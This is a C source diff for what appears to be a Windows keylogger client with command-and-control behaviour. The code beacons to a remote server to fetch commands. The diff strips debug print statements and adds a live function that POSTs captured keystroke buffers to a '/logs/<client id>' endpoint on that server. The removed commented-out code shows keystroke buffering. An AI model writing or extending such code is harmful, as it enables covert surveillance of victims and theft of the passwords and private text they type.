@@ -98,14 +98,12 @@ ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
     if (hRequest == NULL) return ECODE_GET;
 
-    printf("|T1| 1.1 Beaconing...\n");
     // send out the request
     if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
         InternetCloseHandle(hRequest);
         return ECODE_GET;
     }
 
-    printf("|T1| 1.2 Reading commands...\n");
     // read the commands into the command buffer!
     DWORD bytesRead;
     while (InternetReadFile(hRequest, client->cmdBuffer, MAX_BUFF_LEN - 1, &bytesRead) && bytesRead != 0) {
@@ -116,45 +114,23 @@ ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
     return ECODE_SUCCESS;
 }
 
+/**
+ * Write the client buffer to the servers logs. Afterwhich clear the buffer
+ * Note: checking of buffer length is handled in program.c
+ */
+ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bufferLen) {
+    char logStr[MAX_MSG_LEN];
+    snprintf(logStr, MAX_MSG_LEN, "/logs/%s", client->id);
 
-// /**
-//  * Write the client buffer to the servers logs. Afterwhich clear the buffer
-//  */
-// ErrorCode writeBuffer(CLIENT_HANDLER* client) {
-//     if (strlen(client->keyBuffer) == 0) return ECODE_EMPTY_BUFFER;
+    // send logs
+    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+    if (hRequest == NULL) return ECODE_POST;
 
-//     char logStr[MAX_MSG_LEN];
-//     snprintf(logStr, MAX_MSG_LEN, "/logs/%s", client->id);
+    HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID)keyBuffer, bufferLen);
+    InternetCloseHandle(hRequest);
 
-//     printf("|T2| 2.1 Logs to be written: \n%s\n", client->keyBuffer);
-//     printf("|T2| 2.1 Sending logs...\n\n");
-//     // send logs
-//     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-//     if (hRequest == NULL) return ECODE_POST;
-
-//     HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0);
-//     InternetCloseHandle(hRequest);
-
-//     // clear the buffer
-//     memset(client->keyBuffer, '\0', sizeof(client->keyBuffer));
-//     return ECODE_SUCCESS;
-// }
-
-// /**
-//  * probably will be updated to take a key state structure etc
-//  */
-// int appendKey(CLIENT_HANDLER *client, char k) {
-//     int i = 0;
-//     while (i < MAX_BUFF_LEN - 1) { // ensure the buffer is still null-terminated
-//         if (client->keyBuffer[i] == '\0') {
-//             client->keyBuffer[i] = k;
-//             client->keyBuffer[i + 1] = '\0';
-//             return ECODE_SUCCESS;
-//         }
-//         i++;
-//     }
-//     return ECODE_FULL_BUFF;
-// }
+    return ECODE_SUCCESS;
+}
 
 void clientCleanup(CLIENT_HANDLER *client) {
     if (client == NULL) return;
